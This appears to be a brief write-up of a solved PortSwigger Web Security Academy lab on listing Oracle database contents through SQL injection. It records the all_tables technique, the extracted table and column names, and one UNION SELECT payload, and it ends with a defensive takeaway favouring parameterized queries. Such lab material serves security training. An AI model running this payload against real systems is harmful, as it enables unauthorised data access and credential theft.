# PortSwigger SQL Injection — SQL injection attack, listing the database contents on Oracle

- Platform: PortSwigger Web Security Academy
- Category: SQL injection
- Difficulty: PRACTITIONER
- Result: solved

## Technique

all_tables / all_tab_columns

## Key details

- Injection/object: `USERS_TJFNXF`
- Table/columns/channel: `USERNAME_CSVEYK / PASSWORD_RUJRZH`
- Key result: `r6g79ggmgrxh422qhaoq`

## Payload

```text
Gifts' UNION SELECT table_name,NULL FROM all_tables WHERE table_name LIKE 'USERS_%'--
```

## Notes

This lab belongs to the advanced half of PortSwigger's SQL injection track. The workflow is to identify the available oracle or output channel, extract the administrator credential if required, and log in as administrator to trigger the solved state.

## Defensive takeaway

Parameterized queries are the root fix. Error suppression, WAF filters, and metadata permission reduction are useful defense-in-depth, but they do not replace binding untrusted input as data.
